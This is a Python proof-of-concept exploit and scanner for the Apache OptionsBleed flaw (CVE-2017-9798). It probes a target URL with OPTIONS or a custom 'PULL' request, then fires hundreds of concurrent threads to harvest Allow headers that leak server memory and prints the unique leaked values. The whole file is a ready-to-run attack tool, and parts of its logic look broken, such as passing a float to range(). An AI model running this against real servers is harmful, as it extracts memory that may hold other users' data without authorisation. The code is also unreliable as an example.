# OptionsBleed (CVE-2017-9798) PoC / Scanner
# br0k3ns0und

import requests
import argparse
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning


parser = argparse.ArgumentParser()
parser.add_argument('url', type=str, help='full URL (including http(s)) to be scanned')
parser.add_argument('-c', '--count', type=int, default=1000, help='number of times to scan (default: 1000)')
parser.add_argument('-f', '--force', type=str, choices={'option', 'custom'},
                    help='forces the scan to attempt using custom verb method OR OPTIONS '
                         '(default: try OPTIONS THEN custom)')
parser.add_argument('-tc', '--thread-count', type=int, default=500, help='max concurrent thread count (default: 500)')
parser.add_argument('-nv', '--no-verify', action='store_false', default=True,
                    help='does not verify ssl connection (may be necessary for self-signed certs)')
parser.add_argument('-ni', '--no-ignore', action='store_true', help='does NOT ignore ssl warnings (default: ignored)')
parser.add_argument('-v', '--verbose', action='store_true', help='prints all headers')
parser.add_argument('-e', '--errors', action='store_true', help='prints all errors')
args = parser.parse_args()

if not args.no_ignore:
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def does_it_bleed(url: str, method: str, verify=True) -> bool:
    header = {'user-agent': 'Mozilla'}
    print(f'[+] checking {method.upper()} method')

    try:
        if method == 'option':
            r = requests.options(url, headers=header, verify=verify, timeout=5)
        elif method == 'custom':
            r = requests.request('PULL', url, headers=header, verify=verify, timeout=5)
        else:
            print(f'[!] invalid method: {method}')
            return False
    except requests.exceptions.ConnectionError:
        print('[!] connection error')
        return False
    except requests.exceptions.ReadTimeout:
        print('[!] connection timed out')
        return False

    # TODO: SSL verify exception
    low_headers = [header.lower() for header in list(r.headers)]
    if args.verbose:
        print(f'[*] VERBOSE: \n'
              f'\t-raw {method.upper()} headers: \n'
              f'\t{" ".join(r.headers.keys())} \n'
              f'\t-low {method.upper()} headers: \n'
              f'\t{" ".join(low_headers)}')

    if 'allow' in low_headers:
        print(f'[+] allow headers detected in {method.upper()} response')
        return True


def bleed(url: str, method='option', verify=True):
    header = {'user-agent': 'Mozilla'}
    try:
        if method == 'custom':
            r = requests.request('PULL', url, headers=header, verify=verify, timeout=2)
        else:
            r = requests.options(url, headers=header, verify=verify, timeout=2)
    except Exception as e:
        errors.append(str(e))
        return

    results.append(r.headers.get('Allow'))


def hemorrhage(count, bleed_method, thread_count=None):
    for i in range(count):
        t = Thread(target=bleed, args=(args.url, bleed_method, not args.no_verify))
        threads.append(t)
        t.start()
    for _thread in threads:
        _thread.join()


def main():
    print('')
    print('\t::OptionsBleed (CVE-2017-9798) Scanner::')
    print('')
    print(f'[+] scanning {args.url} to see if it bleeds!')

    if args.force:
        if does_it_bleed(args.url, args.force):
            hemorrhage(args.count, args.force)
        else:
            print('[+] allow header NOT detected')
            exit(1)
    else:
        options_test = does_it_bleed(args.url, 'option')
        custom_test = does_it_bleed(args.url, 'custom')
        method_count = 1

        if options_test and custom_test:
            method_count = 2
        if options_test:
            print('[+] scanning with OPTIONS method...')
            hemorrhage(args.count / method_count, 'option')
        if custom_test:
            print('[+] scanning with custom (PULL) method...')
            hemorrhage(args.count / method_count, 'custom')
        if not options_test and not custom_test:
            print('[+] allow header NOT detected')
            exit(1)

    print(f'[+] {len(results)} responses captured')
    print('[+] unique results: \n{0}'.format('\n'.join(list(set(results)))))

    if args.errors:
        print(f'[+] {len(errors)} errors captured')
        print('[+] unique errors:\n{0}'.format('\n'.join(list(set(errors)))))

    print('[+] scan complete!')


if __name__ == '__main__':
    threads = []
    results = []
    errors = []
    main()
